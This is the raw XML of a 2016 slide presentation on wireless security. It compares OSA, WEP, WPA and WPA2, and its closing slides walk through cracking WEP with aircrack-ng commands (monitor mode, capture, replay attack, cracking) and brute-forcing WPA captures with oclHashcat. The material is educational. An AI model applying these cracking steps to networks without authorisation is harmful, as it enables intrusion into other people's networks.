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909C0000166FD21A14F0A9096EB5.svg" manifest:media-type="image/svg+xml"/>
  <manifest:file-entry manifest:full-path="Pictures/10000201000006D50000010FDE49064AA9806D4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3.17cm"/>
    </style:style>
    <style:style style:name="pr7" style:family="presentation" style:parent-style-name="BrightBlue-title">
      <style:graphic-properties fo:min-height="3.531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reless Security</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr2" draw:text-style-name="P2" draw:layer="layout" svg:width="25.199cm" svg:height="12.179cm" svg:x="2.801cm" svg:y="5.588cm" presentation:class="subtitle" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L1">
              <text:list-item>
                <text:p text:style-name="P1">OSA vs WEP</text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P1">WPA and WPA II</text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P1">Tools for hacking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OSA vs SKA (1997)</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr5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4"><text:span text:style-name="T1">Open System Association | Shared Key Auth</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P4"><text:span text:style-name="T1">OSA: Complete Free-for-all – no auth at all</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P4"><text:span text:style-name="T1">SKA: Used WEP for Authentication</text:span></text:p>
                <text:list>
                  <text:list-item>
                    <text:p><text:span text:style-name="T1">Wireless Equivalent Protoc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WEP and why it sucks</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr5" draw:layer="layout" svg:width="26.286cm" svg:height="15cm" svg:x="1.4cm" svg:y="5.066cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>Streaming Algorithm</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>RC4 – stream cipher in synchronous mode</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Need to keep sync at all times (wireless is bad at that)</text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p>Per-packet master key re-use</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Every single packet sent holds the RC4 hash</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>More exposure = more vulnerability</text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p>Limited AP keys</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>WEP only allows 1-4 secret keys so every AP on the network has to share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7" draw:layer="layout" svg:width="20.77cm" svg:height="3.531cm" svg:x="0.82cm" svg:y="0.768cm" presentation:class="title" presentation:user-transformed="true">
          <draw:text-box>
            <text:p>WEP and why it sucks (cont.)</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr5" draw:layer="layout" svg:width="26.286cm" svg:height="15cm" svg:x="1.4cm" svg:y="5.066cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>No AP to client auth</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>MITM attacks are easy</text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p>Confidentiality Vulnerabilities in header</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Headers aren't verified by Integrity Checker</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Makes Redirection Attacks easy</text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p>Integrity Checker is basically garbage</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>No sequence numbers or timestamps</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Replay attacks are easy and effec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WPA (2003)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ttempt to re-engineer WEP while using hardware already available</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Movements towards standardization</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>802.11i – group for increased security </text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>WiFi Alliance – standardization between vend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Improvements on WEP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WPA Improvements</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Integrity checker allowed for 56 bits (stronger keys)</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Passwords sent per session, not per packet</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Auth built on 802.1X framework and TKIP</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Packet sequence numbers (no replay attacks)</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Integrity checker for header and payload (no redirection attack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Improvements on WP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WPA2 (2004)</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Transition to AES instead of RC4</text:p>
                    <text:list>
                      <text:list-item>
                        <text:p>Way stronger in general</text:p>
                      </text:list-item>
                    </text:list>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Revamped Integrity Checking</text:p>
                    <text:list>
                      <text:list-item>
                        <text:p>Leverage AES and better hardware</text:p>
                      </text:list-item>
                      <text:list-item>
                        <text:p>CCMP (Counter Mode Cipher Block Chaining Message Authentication Code Protocol) (wtf)</text:p>
                        <text:list>
                          <text:list-item>
                            <text:p>Basically encrypted encapsulation</text:p>
                          </text:list-item>
                        </text:list>
                      </text:list-item>
                    </text:list>
                  </text:list-item>
                  <text:list-item>
                    <text:p>More secure key establishment and au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Aircrack-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uite of tools for assessing WiFi network security ™</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Monitoring (packet capturing and processing)</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Attacking (replay attacks, deauths, fake AP, etc)</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Testing</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Cracking (WEP and WPA PSK I+I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Using it to break WEP</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr5" draw:layer="layout" svg:width="26.286cm" svg:height="15.508cm" svg:x="1.4cm" svg:y="5.066cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p>iwconfig – check for wireless capabilities</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>airmon-ng start wlan0</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Set your wireless card to monitor mode</text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p>airodump-ng mon0</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Start monitoring for crazy stuff in the air</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Searching for AP's (John's iPhone)</text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p>Airodump-ng –bssid “mac” -c “channel” -w WEPCrack mon0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Using it to break WEP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Open a different terminal</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>aireplay-ng -3 -b 'AP_mac' -h 'host_mac' mon0</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Initiate a replay attack</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Looking for about 15k+ #Data</text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p>aircrack-ng WEPcrack-01.cap</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>Cracking</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p>Just wait for it and hope basic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Using it to crack WP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asically the same method besides the last part</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>WPA is strong enough that you have to bruteforce the pcap instead of doing analysis</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>oclHashcat &gt; Aircrack-ng because of rainbow tables and rule based cracking</text:p>
                <text:list>
                  <text:list-item>
                    <text:p>5 minutes vs 2 ho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6D50000010FDE49064AA9806D4A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16:27:12.572000000</meta:creation-date>
    <dc:date>2016-02-01T19:41:00.918000000</dc:date>
    <meta:editing-duration>PT2H28M27S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:object-count="77"/>
    <meta:generator>LibreOffice/5.0.3.2$Windows_x86 LibreOffice_project/e5f16313668ac592c1bfb310f4390624e3dbfb75</meta:generator>
  </office:meta>
</office:document-meta>
</file>